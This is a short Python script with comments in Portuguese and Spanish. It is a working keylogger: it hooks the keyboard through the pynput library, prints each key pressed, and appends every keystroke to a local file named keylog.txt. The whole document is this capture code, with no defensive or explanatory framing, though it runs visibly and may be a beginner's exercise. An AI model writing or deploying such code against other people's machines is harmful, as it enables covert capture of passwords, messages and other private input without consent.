import pynput

def on_press(key):
    print("Tecla pressionada:", key)
    with open("keylog.txt", "a") as f:
        # Guardar la tecla presionada en el archivo
        f.write(str(key))

print("Iniciando o keylogger...")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
#presiona una tecla hola como estas 
